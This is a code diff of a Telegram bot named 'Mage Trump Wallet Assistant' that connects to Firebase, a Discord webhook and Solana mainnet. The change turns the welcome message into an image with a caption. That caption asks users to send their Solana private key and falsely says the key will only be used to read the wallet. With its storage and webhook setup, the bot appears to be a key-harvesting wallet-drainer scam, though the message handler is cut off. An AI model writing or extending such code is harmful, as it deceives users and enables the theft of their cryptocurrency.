@@ -1,4 +1,5 @@
 require('dotenv').config();
+const path = require('path');
 const { Telegraf } = require('telegraf');
 const admin = require('firebase-admin');
 const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
@@ -7,7 +8,7 @@ const bs58 = rawBs58.default || rawBs58;
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON); // ✅ CORRIGIDO
+const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON);
 const discordWebhook = process.env.DISCORD_WEBHOOK;
 
 admin.initializeApp({
@@ -18,11 +19,22 @@ const db = admin.firestore();
 const connection = new Connection("https://api.mainnet-beta.solana.com");
 
 bot.start((ctx) => {
-  ctx.reply(`👋 Welcome to Mage Trump Wallet Assistant!
+  ctx.replyWithPhoto(
+    // ✅ Use imagem local
+    { source: path.resolve(__dirname, 'images/trumpmage.png') },
+    
+    // Ou comente a linha acima e use um link direto:
+    // { url: 'https://seuservidor.com/imagens/trumpmage.png' },
 
-To continue, please send your Solana **private key** (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.
+    {
+      caption: `👋 *Welcome to Mage Trump Wallet Assistant!*
 
-⚠️ Your key will be used to read your wallet only. Keep it safe.`);
+To continue, please send your Solana *private key* (in base58 format or JSON array). This will allow the bot to connect to your wallet and show your status.
+
+⚠️ Your key will be used to read your wallet only. Keep it safe.`,
+      parse_mode: 'Markdown'
+    }
+  );
 });
 
 bot.on('text', async (ctx) => {
